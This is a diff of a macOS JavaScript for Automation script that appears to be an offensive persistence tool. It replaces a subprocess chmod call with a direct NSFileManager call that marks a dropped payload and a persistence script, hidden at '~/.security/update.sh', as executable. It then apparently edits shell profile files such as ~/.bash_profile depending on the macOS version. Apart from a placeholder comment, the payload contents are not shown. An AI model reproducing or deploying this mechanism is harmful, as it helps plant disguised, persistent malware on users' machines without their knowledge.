@@ -19,6 +19,14 @@ function writeTextToFile(text, file, overwriteExistingContent) {
         app.write(text, { to: openedFile, startingAt: app.getEof(openedFile) })
         app.closeAccess(openedFile)
 }
+	function chmod(value, path) {
+        let a = $({NSFilePosixPermissions:value})
+        let p = $(path).stringByStandardizingPath
+        let e = $()
+        let r = $.NSFileManager.defaultManager
+                .setAttributesOfItemAtPathError(a, p, e)
+        return r
+    }
 
 //PLACEHOLDER: change based on which process you want to monitor for (e.g. osascript)
 var payload =
@@ -50,21 +58,8 @@ writeTextToFile(payload, payloadPath, true)
 var persistPath = userHome + '/.security/update.sh'
 writeTextToFile(persist, persistPath, true)
 
-function executeBackground(actionPath){
-	var path = "/bin/chmod"
-	var args = ["+x",actionPath,"&"]
-	var pipe = $.NSPipe.pipe;
-	var file = pipe.fileHandleForReading;
-	var task = $.NSTask.alloc.init;
-	task.launchPath = path;
-	task.arguments = args;
-	task.standardOutput = pipe; 
-	task.standardError = pipe;
-	task.launch; 
-	}
-	
-executeBackground(payloadPath)
-executeBackground(persistPath)
+chmod(0o755,payloadPath)
+chmod(0o755,persistPath)
 	
 if (sysVers < "10.15.0") {
 profilePath = userHome + '/.bash_profile'
